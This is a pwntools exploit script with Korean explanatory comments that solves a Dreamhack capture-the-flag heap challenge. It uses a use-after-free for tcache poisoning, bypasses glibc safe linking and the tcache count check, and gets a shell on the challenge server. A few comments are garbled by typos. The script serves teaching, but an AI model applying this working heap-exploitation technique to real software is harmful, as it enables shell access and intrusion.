from pwn import *
#p = process('./main')
p = remote('host3.dreamhack.games', 10294)
e = ELF('./main')
libc = ELF('libc.so.6')
'''
---함수 설명----
create_note()
malloc()을 통해 0x10만큼의 메모리 할당을 요청함
이후 할당 받은 청크의 주소를 반환후 notes[idx]에 저장함

delete_note()
notes[idx]에 할당 받은 메모리를 해제함
이때, 할당 해제한 메모리를 중복해서 해제할 수 없도록 
note_deleted[idx]를 통해 확인함

edit_note()
notes[idx]에 할당받은 메모리에 8 바이트만큼 값을 입력받음

test_target()
target변수의 값이 0이 아닐 경우 셸을 반환하고 target변수의 주소는 0x10으로 정렬되어 있음
'''
'''
--취약점 분석--
delete_note()를 통해 할당 된 메모리를 해제한 이후 해당하는 notes[idx]에 저장된 주소 값으 ㄹNULL로 초기화하기 않기 떄문에 UAF발생
이로 인해 tcache리스트 내부 청크의 next를 조작해 tcachepoinsoning 고역ㄱ이 가능하고 임의 위치에 메모리를 할당 받을 수 있음
'''


def create_note(idx):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b': ', str(idx).encode())
    return int(p.recvline().decode().split(' ')[-1], 16)

def delete_note(idx):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b': ', str(idx).encode())

def edit_note(idx, content):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b': ', str(idx).encode())
    p.sendlineafter(b'Content: ', content)

def test_target():
    p.sendlineafter(b'> ', b'4')

'''
tcache poisoning을 이용해 임의 위치에 청를 할당하고 target의 값을 변경하면 셸을 획득할 수 있음
이떄, 원격 환경의 glibc버전이 2.35이기 때문에 safe linking을 우회하여 tcache poisoning을 수행해야 함

1. tcache->counts[tc_idx] 검사 우회하기
glibc2.30버전부터 malloc()은 tcache크기에 해당하는 메모리를 할당할 때 tcache리스트 내에 존재하는 청크의 수인
tcache->counts[tc_idx]가 0보다 큰지 확인하는 방싣으로 tcache리스트에서 할당이 가능한지 확인함

만약 해당 검증을 통과하지 못한다면 malloc()은 tcache리스트가 아닌 fastbin, smallbin등 다른 영역에서 메모리 할당을 시도함

아래 코드는 mallic이 호출하게 되는 __libc_malloc()에서 해당하는 부분을 나타낸 코드임

void *
__libc_malloc(size_t bytes)
{
...
    if (tc_idx < mp_.tcache_sins
        && tcache
        &&tcache -> counts[tc_idx]> 0)
        {
            victim = tcache_get(tc_idx);
            return tag_new_usble(victim);
        }
}

해당 검증이 없는 상황을 가정하면 tcache poisoning시나리오는                     tcache리스트 상태
1. tcache 사이즈에 해당하는 청를 할당하고 해제 해당 청크를 A라고 가정         tcache -> A
2. UAF등 취약점을 이용하여 A청크의 next필드를 임의 주소로 덮어씀 해당 임의 주소를 B라고 가정           tcache->A->B
3. 해당 tcache리스트에서 청크를 할당 받음 그 결과로 A청크가 재할당됨             tcache->B
4. 해당 tcache리스트에서 청크를 할당 받음 그 결과 B청크가 재할당됨       tcache ->NULL

하지만 해당 검증이 추가 되면 문제가 발생함
                                                                            tcache리스트    tcache->counts[tc_idx]
1. tache사이즈에 해당하는 청크를 할당하고 해제 해당 컹르르 A라고 가정       tcache->A       1(해제 1회)
2. UAF등 취약점을 이용하여 A청크의 next필드를 임의 주소로 덮어씀            tcache->A->B    1 
해당 임의 주소를 B라고 가정
3. 해당 tcache리스트에서 청크를 할당 받음 그 결과로 A청크가 재할당됨        tcache->B       0(할당1회)
4. 해당 tcache리스트에서 청크를 할당 받고자 할떄,                           tcache->B       0     
tcache->counts[tc_idx] > 0 검증으로 인해 tcache가 아닌 다른 영역에서 메모리를 할당

해당 검증을 우회하고 tcache리스트에서 청크를 할당해오기 위해서는 우리가 목표로 하는 tcache리스트에 해당하는 청크를 사전에 여러번 해제하여
tcache_>counts[tc_idx]의 값을 인위적으로 키워두는 방식으로 검사 로직을 우회해야 함

                                                                                        tcache리스트        tcache->counts[tc_idx]
1. tcache사이즈에 해당하는 청크를 3개 할당하고 해제 해당 청크를 A, C, D라고 가정        tcache->A->c->D     3(해제 3회)
2. UAF등 취약점을 이용하여 A청크의 next필드를 임의 주소로 덮어 씀                       tcache->A->B        3
해당 임의 주소를 B라고 가정
3. 해당 tcache리스트에서 청크를 할당 받음 그결과로 A청크가 재활당함                     tcache->B           2(할당1회)
4. 해당 tcache리스트에서 청크를 할당 받음, tcache->counts[tc_idx] > 0                   tcache->NULL        1(할당 1회)
검증을 통과하기 떄문에 그 결과로 tcache에 B청크가 재할당됨

#2. tcache poisoning
glibc2.32 미만 버전에서는 safe linking이 존재하지 않기 때문에 해제된 tcache청크의 next 포인트에 목표한 
주소를 그대로 덮어쓰는 방식으로 공격을 수행할 수 있었지만 glinc2.32이상 버전에서는 safe linking이 적용되었기 때문에 
PROTECT_PTR()을 고려하여 next포인터에 목표한 주소를 인코딩 한 후 덮어써야 함

해당 부분은 create_note()에서 제공하는 청크 주소를 이용해 PROTECT_PTR()매크로 로직대로 연산을 수행해 우회가 가능
PROTECT_PTR()은 다음과 같이 구현되어 있으므로 청크 주소를 12비트만큼 RIGHTSHIFT하고 임의로 할당 받고자 하는 주소와 XORgksms qkdtlrdmfh wogus rksmd

#define PROTECT_PTR(pos,ptr) \
    ((__typeof (ptr)) ((((size_t) pos >> 12) ^ (size_t) ptr)))

익스플로잇 시나리오 
1. create_note()로 tcache크기의 청크 3개 할당
2. 1에서할당 받은 모든청크를 할당 해제(tcache->counts[tc_idx] > 0조건 우회 목적)
3. PROTECT_PTR을 고려하며 가장 마지막으로 할당 해제한 청크의 next를 덮어서 tcache_poisoning수행
4. creat_note()로 tcache리스트에서 청크를 두번 할당하여 target에 메모리 할당
5. edit_note()로 target의 값을 수정한 후 셸 획득


'''


heap_addr =create_note(0)
create_note(1)
create_note(2)

delete_note(2)
delete_note(1)
delete_note(0)

edit_note(0, p64(e.symbols['target'] ^ (heap_addr >> 12)))
'''
38번 라인에서 next를 변조해 tcache poisoning을 수행 할떄 safe linking을 고려하여
next 필드를 덮어씀에 주목

위 방식은 partial RELRO보호기법이 적용되어서 tcache poisoning으로 GOT영역에 임의의 청크를할당한 후 해당 청크의 데이터를 수정하는 방식으로
GOT overwrite를 수행하는 방법으로도 풀수  있음
'''

create_note(0)
create_note(1)

edit_note(1, b'A')

test_target()
p.interactive()

'''
최신 버전에서는 tcache와 fastbin을 대상으로 fd, next를 덮어써 해당 리스트를 오염시키는 공격은
PRTECT_PTR()의 적용으로 인해 덮어쓰기를 진행할 청크의 주소 혹은 과련된 정보를 알아낸후 연산 진행
'''